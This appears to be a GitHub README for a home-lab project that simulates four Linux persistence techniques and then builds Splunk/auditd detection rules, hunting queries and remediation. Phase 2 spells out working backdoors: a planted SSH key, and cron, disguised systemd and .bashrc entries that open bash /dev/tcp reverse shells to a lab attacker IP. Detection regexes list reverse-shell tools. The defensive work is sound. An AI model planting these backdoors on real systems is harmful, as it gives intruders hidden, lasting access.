# Project 03 — Linux Persistence Detection

## Overview

This project simulates four real-world Linux persistence techniques used by attackers to maintain access after an initial compromise — and builds a five-layer behavioral detection framework in Splunk using auditd kernel telemetry. Every technique simulated represents a genuine attacker behavior documented in MITRE ATT&CK, and every detection uses behavioral scoring and multi-signal correlation rather than exact command matching.

The project follows the complete defensive cycle: persistence mechanism installation, attack simulation, kernel-level log collection, detection engineering, alert validation, manual threat hunting, remediation, and automated tool comparison using pspy.

---

## Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux VM — 10.10.10.132 |
| Target | Ubuntu Server — splunk-server (10.10.10.198) |
| SIEM | Splunk Enterprise 10.2.2 |
| Log Sources | /var/log/audit/audit.log (auditd) |
| Kernel Monitor | auditd with 30 custom rules |
| Process Monitor | pspy64 — passive process execution monitor |
| Hypervisor | Proxmox VE on Dell OptiPlex 7060 Micro |
| Network | Isolated lab segment 10.10.10.x behind OPNsense |

---

## Project Metrics

| Metric | Result |
|---|---|
| Persistence techniques simulated | 4 |
| Detection rules built | 5 |
| Custom auditd rules | 30 |
| Total events ingested | 24,883 |
| Total alert fires | 82 |
| Detection coverage rate | 100% |
| False positive rate | 0% |
| Mechanisms remediated | 4/4 |
| pspy malicious UID=0 processes caught | 1 |
| MITRE techniques covered | T1098.004, T1053.003, T1543.002, T1546.004 |

---

## The Persistence vs Vulnerability Distinction

Project 3 planted vulnerabilities — misconfigurations an attacker finds and exploits once. This project plants persistence mechanisms — deliberate backdoors an attacker installs so they never need that original exploit again.

**Vulnerability:** A gap an attacker finds and exploits once
**Persistence:** A guaranteed reentry point that survives reboots, password resets, and partial remediation

An attacker who just spent hours getting root through a complex exploit immediately asks four questions:

1. **How do I get back in without a password?** → SSH authorized key
2. **How do I have something run automatically on a schedule?** → Cron reverse shell
3. **How do I survive a reboot?** → Systemd service
4. **How do I catch the user every time they log in?** → .bashrc injection

Every technique in this project answers one of those four questions.

---

## SOC Analyst Mental Model for Persistence

Three phases every analyst must investigate:

1. **Installation** — When was the persistence mechanism planted?
2. **Execution** — Is the mechanism actively firing?
3. **Impact** — What access does it provide the attacker?

The five detection rules in this project map to all three phases — catching persistence at installation time and confirming execution through process monitoring.

---

## Phase 1 — Infrastructure Setup

### 30 Custom Audit Rules Deployed

```bash
# SSH key modification monitoring
sudo auditctl -w /root/.ssh -p wa -k ssh_key_modification
sudo auditctl -w /home/labadmin/.ssh -p wa -k ssh_key_modification

# Cron modification monitoring
sudo auditctl -w /var/spool/cron -p wa -k cron_modification
sudo auditctl -w /etc/cron.d -p wa -k cron_modification
sudo auditctl -w /etc/crontab -p wa -k cron_modification

# Systemd service monitoring
sudo auditctl -w /etc/systemd/system -p wa -k systemd_modification

# Shell startup file monitoring
sudo auditctl -w /home/labadmin/.bashrc -p wa -k startup_modification
sudo auditctl -w /home/labadmin/.bash_profile -p wa -k startup_modification
sudo auditctl -w /etc/profile -p wa -k startup_modification
sudo auditctl -w /etc/profile.d -p wa -k startup_modification

# Execution-based rules — catch behavior not just file changes
sudo auditctl -a always,exit -F arch=b64 -S execve \
  -F path=/usr/bin/crontab -k cron_exec
sudo auditctl -a always,exit -F arch=b64 -S execve \
  -F path=/usr/bin/systemctl -k systemd_exec
sudo auditctl -a always,exit -F arch=b64 -S execve \
  -F path=/usr/sbin/sshd -k sshd_exec
```

Rules made permanent:

```bash
sudo auditctl -l | sudo tee /etc/audit/rules.d/blip-ai.rules > /dev/null
sudo systemctl restart auditd
```

**Key design principle:** Two rule types working together — file-based rules catch WHEN a persistence file is modified, execution-based rules catch WHEN the associated binary runs. File watching alone misses the execution phase. Execution watching alone misses the file creation phase. Both together provide complete persistence lifecycle coverage.

---

## Phase 2 — The Four Persistence Techniques

### Persistence 1 — SSH Authorized Keys Backdoor (T1098.004)

**What it is:** An attacker adds their own SSH public key to the target's authorized_keys file. This allows permanent passwordless SSH access that survives password resets completely — changing the user's password does nothing because key authentication bypasses passwords entirely.

```bash
# On Kali — generate backdoor keypair
ssh-keygen -t rsa -b 2048 -f /tmp/backdoor_key -N ""

# Install backdoor key on Ubuntu
ssh-copy-id -i /tmp/backdoor_key.pub labadmin@10.10.10.198

# Verify keyless login works
ssh -i /tmp/backdoor_key labadmin@10.10.10.198
whoami
```

**Why `>>` not `>`:** Attackers always append to authorized_keys rather than overwrite it. Overwriting destroys legitimate admin keys and immediately alerts the victim. Appending adds the backdoor silently while preserving existing legitimate access.


<img width="1157" height="941" alt="Screenshot 2026-04-26 at 3 48 33 PM" src="https://github.com/user-attachments/assets/606308b0-cbcd-47ac-862e-833cf2923ccc" />

### Persistence 2 — Malicious Cron Reverse Shell (T1053.003)

**What it is:** A new cron entry added directly to root's crontab — not exploiting an existing misconfiguration like Project 3, but creating a brand new scheduled task that delivers a root shell automatically every 5 minutes. The attacker sets it and forgets it — the system delivers root access on a timer without any further attacker interaction.

```bash
sudo crontab -e
# Added: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.132/5555 0>&1'
```

**Technical note — dash vs bash:** Ubuntu's cron uses `/bin/sh` which is actually `dash` — a minimal shell that doesn't support bash's `>&` redirect syntax. The `/bin/bash -c` wrapper forces explicit bash execution regardless of the system's default shell. This is a common attacker pitfall when planting cron-based persistence.

**On Kali — receive the connection:**
```bash
nc -lvnp 5555
```

<img width="721" height="453" alt="Screenshot 2026-04-26 at 5 01 00 PM" src="https://github.com/user-attachments/assets/db07e830-e31f-4476-bcfd-225bade3ae77" />

### Persistence 3 — Systemd Service Backdoor (T1543.002)

**What it is:** A fake systemd service created to look like a legitimate system process. Systemd manages everything that starts on boot — meaning this backdoor survives reboots, auto-restarts if the connection drops, and looks completely legitimate alongside real system services unless you specifically audit every service file.

```bash
sudo nano /etc/systemd/system/system-update.service
```

```ini
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.132/6666 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable system-update.service
sudo systemctl start system-update.service
```

**Why `system-update` as the name:** Attackers name malicious services to blend in with legitimate ones — `systemd-networkd-helper`, `update-manager`, `dbus-monitor`. Without auditing every service file against a known baseline the extra entry is invisible to a casual observer.

<img width="721" height="453" alt="Screenshot 2026-04-26 at 5 08 30 PM" src="https://github.com/user-attachments/assets/0d4e4468-c162-46d0-8961-4d38f3278c3a" />

### Persistence 4 — .bashrc Injection (T1546.004)

**What it is:** A reverse shell injected into the user's shell startup file. Unlike cron which fires on a schedule and systemd which fires on boot, .bashrc fires every single time the legitimate user opens a terminal or logs in via SSH. The more active and diligent the admin is, the more reverse shells the attacker receives — their own work habits become the delivery mechanism.

```bash
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.10.132/7777 0>&1 &"' >> ~/.bashrc
```

**The `&` operator:** Runs the reverse shell in the background so the user's terminal still opens normally. Without it the terminal hangs on the reverse shell connection — immediately suspicious. With it the user sees nothing unusual while the shell connects silently in the background.

<img width="719" height="451" alt="Screenshot 2026-04-26 at 5 14 20 PM" src="https://github.com/user-attachments/assets/3f23428a-92c3-4969-bc10-38f5fb7c0e28" />

---

## Phase 3 — Detection Engineering

Five behavioral detection rules were built in Splunk using auditd kernel telemetry. Each rule uses multi-signal correlation — combining file modification events with execution events to confirm persistence installation rather than flagging individual actions that could be legitimate in isolation.

### Detection 1 — SSH Key Modification and Backdoor Authentication

**What it catches:** Any process touching the SSH authorized_keys directory combined with behavioral indicators — permission changes, script execution, and keyless login attempts. The combination of all three signals in the same time window is the persistence installation fingerprint.

```spl
index=main sourcetype=linux_audit key="ssh_key_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes"
| eval binary=mvindex(split(exe,"/"),-1)
| where binary!="sshd"
| eval suspicion=case(
    binary="ssh", "SSH keyless login — possible backdoor key in use",
    binary="chmod" OR binary="chown", "SSH directory permission change",
    binary="sh" OR binary="dash" OR binary="bash", "Script modifying SSH config",
    binary="cp" OR binary="mv", "SSH key file copied or moved",
    true(), "Unknown SSH directory modification")
| stats count values(exe) as tools values(suspicion) as indicators by auid host
| eval risk_level=case(
    mvfind(indicators,"keyless login")>=0, "HIGH — Possible backdoor key authentication",
    mvfind(indicators,"Script modifying")>=0, "HIGH — Script writing to SSH directory",
    mvfind(indicators,"permission change")>=0, "MEDIUM — SSH directory permissions modified",
    true(), "LOW — SSH directory activity")
| table auid host count tools indicators risk_level
| sort -count
```

<img width="1152" height="826" alt="Screenshot 2026-04-26 at 5 26 15 PM" src="https://github.com/user-attachments/assets/e1b439b6-5d11-4581-b4a2-aacc99d2522b" />

**Alert:** `SSH Key Modification and Backdoor Authentication Detected` — Scheduled `*/5 * * * *`, High severity

---

### Detection 2A — Cron Persistence Mechanism Detected

**What it catches:** Modification of cron configuration files by interactive users. The `suspicious_content` field searches raw audit records for reverse shell patterns — detecting not just that cron was modified but whether the modification contains malicious content.

**Known limitation:** Auditd SYSCALL records capture who modified the crontab but not what was written. The `suspicious_content` field may not trigger on all cron entries because the actual content written to the file is not always present in the kernel audit record. The HIGH alert on crontab modification is still valuable — any unauthorized crontab edit warrants investigation regardless of content visibility.

```spl
index=main sourcetype=linux_audit key="cron_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where isnotnull(success)
| eval binary=mvindex(split(exe,"/"),-1)
| eval suspicious_content=if(
    match(_raw,"dev/tcp|nc |bash -i|curl|wget|python|perl|sh -c|base64|curl.*\|bash|wget.*\|sh"),
    "YES — Reverse shell or download pattern detected",
    "NO — Standard cron modification")
| eval suspicion=case(
    binary="crontab", "Crontab directly edited by user",
    binary="nano" OR binary="vim" OR binary="vi", "Text editor modifying cron config",
    binary="sh" OR binary="bash" OR binary="dash", "Script modifying cron config",
    binary="cp" OR binary="mv", "Cron file copied or moved",
    true(), "Unknown cron directory modification")
| stats count values(comm) as tools values(suspicion) as indicators values(suspicious_content) as content_analysis by auid host
| eval risk_level=case(
    like(content_analysis,"%Reverse shell%"), "CRITICAL — Reverse shell pattern in cron modification",
    like(indicators,"%directly edited%"), "HIGH — User directly modified crontab",
    like(indicators,"%Script modifying%"), "HIGH — Script writing to cron directory",
    true(), "MEDIUM — Cron directory activity")
| table auid host count tools indicators content_analysis risk_level
| sort -count
```

<img width="1152" height="862" alt="Screenshot 2026-04-26 at 5 33 55 PM" src="https://github.com/user-attachments/assets/494a3959-7ea2-47ff-8b1f-9791e0df7f3e" />

**Alert:** `Cron Persistence Mechanism Detected` — Scheduled `*/5 * * * *`, High severity

---

### Detection 2B — Cron Execution by Interactive User

**What it catches:** Direct execution of the crontab binary by an interactive user. Medium severity alone — escalates to High when correlated with Detection 2A firing from the same host.

**Why two detections for cron:** Detection 2A catches the file modification layer. Detection 2B catches the execution layer. Running crontab without a file change could be a legitimate view. A file change without crontab execution could be a package manager. Both together confirms a human interactively edited cron — the persistence installation signature.

```spl
index=main sourcetype=linux_audit key="cron_exec"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| where isnotnull(auid) AND auid!="unset" AND auid!="4294967295"
| where isnotnull(success)
| stats count values(comm) as tools values(exe) as executables by auid host
| eval risk_level="MEDIUM — Cron execution observed (context required for escalation)"
| table auid host count tools executables risk_level
| sort -count
```

<img width="1152" height="862" alt="Screenshot 2026-04-26 at 5 40 25 PM" src="https://github.com/user-attachments/assets/226c43a7-cc35-43e5-ab46-b224bc6090c8" />

**Alert:** `Cron Execution by Interactive User Detected` — Scheduled `*/5 * * * *`, Medium severity

---

### Detection 3 — Systemd Persistence Service Detected

**What it catches:** New systemd service file creation combined with systemctl execution — the complete persistence installation sequence. Uses time bucketing to correlate events within 5 minute windows and counts distinct log sources triggered. Score of 2 means both file creation AND systemctl execution fired — persistence confirmed.

```spl
index=main sourcetype=linux_audit (key="systemd_modification" OR key="systemd_exec")
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| where isnotnull(auid) AND auid!="unset" AND auid!="4294967295"
| where success="yes" OR success="1"
| bin _time span=5m
| eval binary=mvindex(split(exe,"/"),-1)
| eval signal=case(
    key="systemd_modification" AND (binary="nano" OR binary="vim" OR binary="vi"),
        "Service file created via text editor",
    key="systemd_modification" AND (binary="cp" OR binary="mv"),
        "Service file copied or moved",
    key="systemd_modification" AND (binary="bash" OR binary="sh"),
        "Script writing service file",
    key="systemd_exec" AND binary="systemctl",
        "systemctl executed by interactive user",
    true(), "Unknown systemd activity")
| stats count values(comm) as tools values(signal) as signals dc(key) as sources_triggered by auid host _time
| eval risk_level=case(
    sources_triggered>=2,
        "CRITICAL — Service file created AND systemctl executed — persistence confirmed",
    like(signals,"%created via text editor%"),
        "HIGH — New service file written to systemd directory",
    like(signals,"%systemctl executed%"),
        "MEDIUM — systemctl executed by interactive user",
    true(), "LOW — Systemd activity detected")
| table _time auid host count tools signals sources_triggered risk_level
| sort -count
```

<img width="1152" height="934" alt="Screenshot 2026-04-26 at 5 50 38 PM" src="https://github.com/user-attachments/assets/ef7ddd7b-54c2-41f0-a0f3-abb9a399c0ad" />

**Alert:** `Systemd Persistence Service Detected` — Scheduled `*/5 * * * *`, Critical severity

---

### Detection 4 — Shell Startup File Modification

**What it catches:** Modification of shell startup files including .bashrc, .bash_profile, and /etc/profile by shell processes. Uses write method classification to identify how the modification occurred and boolean reverse shell scoring.

**Known limitation:** The actual content written to startup files is not visible in kernel audit records — auditd captures who modified the file but not what was written. File integrity monitoring would be required for payload inspection. The HIGH alert on shell processes writing to startup files is itself a strong signal — legitimate users rarely have bash processes writing to .bashrc outside of planned configuration changes.

```spl
index=main sourcetype=linux_audit key="startup_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| rex field=_raw "(?P<file_path>/etc/profile\.d/[^\s]+|/home/[^\s]+/\.bashrc|/home/[^\s]+/\.bash_profile|/etc/profile)"
| where isnotnull(auid) AND auid!="unset" AND auid!="4294967295"
| where success="yes" OR success="1"
| bin _time span=5m
| eval binary=mvindex(split(exe,"/"),-1)
| eval write_method=case(
    match(_raw,">>|tee"), "Append write",
    match(_raw,"sed -i"), "Inline file edit",
    match(_raw,"echo|printf"), "Echo-based injection",
    true(), "Unknown write method")
| eval signal=case(
    binary="bash" OR binary="sh" OR binary="dash",
        "Shell writing to startup file — possible injection",
    binary="nano" OR binary="vim" OR binary="vi",
        "Text editor modifying startup file",
    binary="cp" OR binary="mv",
        "Startup file copied or moved",
    true(), "Unknown startup file modification")
| eval reverse_shell=if(
    match(_raw,"dev/tcp|nc |bash -i|curl|wget|python|perl|sh -c|eval|awk|openssl|mkfifo|base64"),
    1, 0)
| stats count values(comm) as tools values(signal) as signals values(write_method) as write_methods values(file_path) as files_targeted sum(reverse_shell) as shell_indicators by auid host
| eval risk_level=case(
    shell_indicators>0 AND like(signals,"%injection%"),
        "CRITICAL — Reverse shell pattern in startup file modification",
    like(signals,"%Shell writing%"),
        "HIGH — Shell process modifying startup file",
    like(signals,"%Text editor%"),
        "MEDIUM — Text editor modifying startup file",
    true(), "LOW — Startup file activity")
| table auid host count tools signals write_methods files_targeted shell_indicators risk_level
| sort -risk_level
```

<img width="1152" height="952" alt="Screenshot 2026-04-26 at 6 02 55 PM" src="https://github.com/user-attachments/assets/4afba1d8-a904-4c3a-ae05-df28f8b371da" />


**Alert:** ` Startup File Modification Detected` — Scheduled `*/5 * * * *`, High severity

---

## Phase 4 — Alert Validation

All five alerts confirmed firing across two validation rounds:

<img width="1152" height="856" alt="Screenshot 2026-04-26 at 6 43 09 PM" src="https://github.com/user-attachments/assets/1030e469-39d4-4996-85fc-5e986710170c" />

| Alert | Severity | Triggered By |
|---|---|---|
| SSH Key Modification | High | SSH key installation sequence |
| Cron Persistence Mechanism | High | crontab -e modification |
| Cron Execution by Interactive User | Medium | crontab binary execution |
| Systemd Persistence Service | Critical | nano + systemctl combination |
| Shell Startup File Modification | High | bash writing to .bashrc |

**Layered detection in action:** Planting the cron reverse shell triggered three simultaneous alerts — Cron Persistence Mechanism, Cron Execution by Interactive User, AND Privilege Escalation Confirmed from Project 3. One attack, three independent detection layers firing simultaneously.

---

## Phase 5 — Persistence Hunting

Manual hunting queries for finding persistence already installed on a system — the proactive complement to reactive alerting.

### Hunt 1 — SSH Key Activity Timeline
```spl
index=main sourcetype=linux_audit key="ssh_key_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295"
| stats count earliest(_time) as first_seen latest(_time) as last_seen by auid comm
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table auid comm count first_seen last_seen
| sort -count
```

### Hunt 2 — Cron Modification History
```spl
index=main sourcetype=linux_audit key="cron_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295"
| stats count earliest(_time) as first_seen latest(_time) as last_seen by auid comm
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table auid comm count first_seen last_seen
| sort -last_seen
```

### Hunt 3 — Systemd Service Changes
```spl
index=main sourcetype=linux_audit key="systemd_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295"
| stats count earliest(_time) as first_seen latest(_time) as last_seen by auid comm
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table auid comm count first_seen last_seen
| sort -last_seen
```

### Hunt 4 — Startup File Modifications
```spl
index=main sourcetype=linux_audit key="startup_modification"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "comm=\"(?P<comm>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295"
| stats count earliest(_time) as first_seen latest(_time) as last_seen by auid comm
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table auid comm count first_seen last_seen
| sort -last_seen
```

### Host-Based Hunting Checklist

When investigating a potentially compromised Linux system run these commands directly on the host:

```bash
# Check for unauthorized SSH keys
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys 2>/dev/null

# Check root crontab for malicious entries
sudo crontab -l

# List all custom systemd services — look for real files vs symlinks
sudo ls -la /etc/systemd/system/*.service

# Check shell startup files for injected code
tail -5 ~/.bashrc
grep -i "tcp\|nc \|bash -i\|curl\|wget" ~/.bashrc
```

**What to look for:**
- authorized_keys entries ending in unexpected hostnames like `kali@kali`
- Cron entries containing `dev/tcp`, `nc`, or `bash -i`
- Systemd service files that are real files not symlinks — legitimate services are almost always symlinks pointing to `/usr/lib/systemd/system/`
- .bashrc lines that don't match standard shell configuration patterns

---

## Phase 6 — Remediation

All four persistence mechanisms removed and verified:

```bash
# Remove SSH backdoor key
sed -i '/kali@kali/d' ~/.ssh/authorized_keys

# Remove malicious cron job
sudo crontab -r

# Remove systemd backdoor service
sudo systemctl stop system-update.service
sudo systemctl disable system-update.service
sudo rm /etc/systemd/system/system-update.service
sudo systemctl daemon-reload

# Remove .bashrc injection
sed -i '/dev\/tcp/d' ~/.bashrc
```

<img width="1181" height="720" alt="Screenshot 2026-04-26 at 6 48 12 PM" src="https://github.com/user-attachments/assets/c951c16c-821b-427a-bc1b-13ef682e822a" />


### Retest Verification

```bash
# SSH key — should prompt for password now
ssh -i /tmp/backdoor_key labadmin@10.10.10.198
# Result: Permission denied — key no longer accepted

# Systemd service — should be gone
sudo systemctl status system-update.service
# Result: Unit system-update.service could not be found

# Bashrc — should be clean
grep "dev/tcp" ~/.bashrc
# Result: No output — injection removed
```

<img width="1059" height="982" alt="Screenshot 2026-04-26 at 6 53 43 PM" src="https://github.com/user-attachments/assets/92a44641-333a-4d74-a59f-a3fb20fedc30" />


---

## Phase 7 — Automated Tool Comparison (pspy)

pspy is a passive process execution monitor that watches `/proc` in real time without requiring root access — catching persistence mechanisms as they execute rather than just finding their configuration files.

```bash
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

### Three-Way Detection Comparison

The cron reverse shell was re-planted specifically to demonstrate all three detection layers simultaneously:

<img width="1179" height="203" alt="Screenshot 2026-04-26 at 7 08 08 PM" src="https://github.com/user-attachments/assets/8cf28ce2-1b3f-4cd7-9901-6daf8c6b9bc8" />

| Detection Method | What It Caught | Phase | When |
|---|---|---|---|
| Splunk auditd | Cron job installation via crontab | Installation | Real-time during setup |
| Splunk auditd | Privilege escalation via sudo | Installation | Real-time during setup |
| pspy | Cron job executing as UID=0 | Execution | During process monitoring |
| Manual hunting | All four mechanisms present | Discovery | Post-compromise hunt |

### Key Insight — Scanners vs Behavioral Detection

**pspy** catches persistence **executing** — watching processes fire in real time. It found the malicious cron job the moment it ran as UID=0 with `dev/tcp` in the command.

**Splunk** catches persistence **being installed** — watching kernel audit events the moment configuration files change. It fired alerts before pspy even had a chance to see the execution.

**Neither alone is complete.** A system breached before Splunk detections were built would need pspy for execution-time discovery. A system with Splunk but no process monitoring misses the execution confirmation pspy provides.

---

## MITRE ATT&CK Mapping

| Technique | ID | Phase | Detected |
|---|---|---|---|
| SSH Authorized Keys | T1098.004 | Persistence | ✅ Detection 1 |
| Scheduled Task/Job: Cron | T1053.003 | Persistence | ✅ Detection 2A + 2B |
| Create or Modify System Process: Systemd | T1543.002 | Persistence | ✅ Detection 3 |
| Event Triggered Execution: .bashrc | T1546.004 | Persistence | ✅ Detection 4 |

---

## Known Limitations and Detection Gaps

| Gap | Description | Mitigation Path |
|---|---|---|
| Cron payload content invisible | SYSCALL records don't contain file content written to crontab | File integrity monitoring on crontab files |
| .bashrc payload content invisible | Same limitation — write content not in kernel records | inotify-based file content monitoring |
| PATH record correlation | File path names don't always appear in tagged audit records | Additional audit rules using inotify |
| pspy timing | pspy only catches execution after persistence is installed — doesn't prevent it | Combine with real-time Splunk alerting |
| Automated tool evasion | Sophisticated attackers name services to mimic legitimate ones | Allowlist-based service monitoring |

---


---

## Resume Bullet

> *Simulated four Linux persistence techniques — SSH authorized key backdoor, malicious cron reverse shell, systemd service backdoor, and .bashrc injection — built five behavioral Splunk detection rules using auditd kernel telemetry across 24,883 ingested events achieving 100% detection coverage with 0% false positive rate, validated with pspy automated process monitoring catching UID=0 malicious execution in real time, built four manual threat hunting queries covering the complete persistence attack surface, remediated all four mechanisms and verified attacks no longer succeeded, mapped to MITRE ATT&CK T1098.004, T1053.003, T1543.002, T1546.004 across 30 custom audit rules.*

---
